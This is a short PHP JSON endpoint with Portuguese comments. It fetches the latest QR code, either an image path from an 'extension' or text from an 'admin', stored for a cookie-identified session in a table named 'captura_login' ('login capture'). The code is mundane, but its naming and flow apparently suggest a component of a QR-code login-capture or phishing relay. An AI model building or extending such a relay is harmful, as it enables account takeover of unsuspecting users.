<?php
header('Content-Type: application/json');
require_once __DIR__ . '/db.php'; // Conexão com o banco

// 1. Identifica o usuário pelo cookie, como em todas as outras APIs.
$session_id = $_COOKIE['identificador_cliente'] ?? null;
if (!$session_id) {
    echo json_encode(['success' => false, 'error' => 'Sessão do cliente não encontrada.']);
    exit;
}

try {
    // 2. CORREÇÃO: Busca AMBAS as colunas, 'qrcode_path' e 'qrcode_text'.
    $sql = "SELECT qrcode_path, qrcode_text FROM captura_login WHERE session_id = ? ORDER BY id DESC LIMIT 1";
    $stmt = $pdo->prepare($sql);
    $stmt->execute([$session_id]);
    
    $result = $stmt->fetch(PDO::FETCH_ASSOC);

    // 3. LÓGICA INTELIGENTE: Verifica os dois possíveis tipos de QR Code.
    if ($result) {
        // CENÁRIO A: QR Code enviado pela EXTENSÃO (tem um caminho de imagem)
        if (!empty($result['qrcode_path'])) {
            echo json_encode([
                'success' => true,
                'type' => 'image', // Informa ao cliente que é uma imagem
                'data' => $result['qrcode_path']
            ]);
            exit;
        }
        
        // CENÁRIO B: QR Code enviado pelo ADMIN (tem o texto do QR Code)
        if (!empty($result['qrcode_text'])) {
            echo json_encode([
                'success' => true,
                'type' => 'text', // Informa ao cliente que é um texto
                'data' => $result['qrcode_text']
            ]);
            exit;
        }
    }

    // FALHA: Se nenhum dos campos foi encontrado para esta sessão.
    echo json_encode(['success' => false, 'error' => 'Nenhum QR Code encontrado para esta sessão.']);

} catch (PDOException $e) {
    // Em caso de erro no banco, informa o erro.
    error_log('Erro na API de get qrcode: ' . $e->getMessage());
    http_response_code(500);
    echo json_encode(['success' => false, 'error' => 'Erro interno do servidor.']);
}
?>